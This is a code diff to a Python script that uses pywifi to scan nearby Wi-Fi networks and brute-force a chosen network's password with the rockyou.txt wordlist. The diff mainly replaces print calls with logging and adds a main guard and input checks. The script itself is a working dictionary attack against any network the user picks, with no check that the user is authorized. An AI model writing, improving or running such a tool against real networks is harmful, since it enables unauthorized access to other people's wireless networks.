@@ -1,5 +1,9 @@
 import pywifi
 import time
+import logging
+
+# Set up logging
+logging.basicConfig(level=logging.INFO)
 
 def wifi_scan():
     wifi = pywifi.PyWiFi()
@@ -28,34 +32,33 @@ def wifi_attack(target_ssid, wordlist_path):
 
                 iface.remove_all_network_profiles()  # Clear previous profiles
                 iface.add_network_profile(profile)  # Add the new profile
-                try:
-                    iface.connect(iface.add_network_profile(profile))  # Attempt to connect
-                    time.sleep(1)  # Wait for connection attempt
-                    print(f"Trying password: {password}")  # Show the password being tried
-                    if iface.status() == pywifi.const.IFACE_CONNECTED:
-                        print(f"Password found! The password is: {password}")
-                        return
-                    else:
-                        print("Password incorrect.")
-                except Exception as e:
-                    print(f"Error connecting: {e}")
-
+                iface.connect(iface.add_network_profile(profile))  # Attempt to connect
+                time.sleep(1)  # Wait for connection attempt
+                logging.info(f"Trying password: {password}")  # Show the password being tried
+                if iface.status() == pywifi.const.IFACE_CONNECTED:
+                    logging.info(f"Password found! The password is: {password}")
+                    return
+                else:
+                    logging.info("Password incorrect.")
     except FileNotFoundError:
-        print(f"Error: Wordlist file '{wordlist_path}' not found.")
+        logging.error(f"Error: Wordlist file '{wordlist_path}' not found.")
     except Exception as e:
-        print(f"An unexpected error occurred: {e}")
+        logging.error(f"An unexpected error occurred: {e}")
 
 # Main execution flow
-networks = wifi_scan()  # Scan for available networks
-print("Available networks:")
-for index, network in enumerate(networks):
-    print(f"{index + 1}: {network.ssid}")  # Displays the actual SSID
+if __name__ == "__main__":
+    networks = wifi_scan()  # Scan for available networks
+    logging.info("Available networks:")
+    for index, network in enumerate(networks):
+        logging.info(f"{index + 1}: {network.ssid}")  # Displays the actual SSID
 
-choice = int(input("Choose a network by number: ")) - 1
-if 0 <= choice < len(networks):
-    target_ssid = networks[choice].ssid  # Get the chosen SSID
-    wordlist_path = 'rockyou.txt'  # Update to the correct path
-    wifi_attack(target_ssid, wordlist_path)  # Attempt Wi-Fi attack with wordlist
-else:
-    print("Invalid choice. Exiting.")
-    exit()
+    try:
+        choice = int(input("Choose a network by number: ")) - 1
+        if 0 <= choice < len(networks):
+            target_ssid = networks[choice].ssid  # Get the chosen SSID
+            wordlist_path = 'rockyou.txt'  # Update to the correct path
+            wifi_attack(target_ssid, wordlist_path)  # Attempt Wi-Fi attack with wordlist
+        else:
+            logging.error("Invalid choice. Exiting.")
+    except ValueError:
+        logging.error("Invalid input. Please enter a number.")
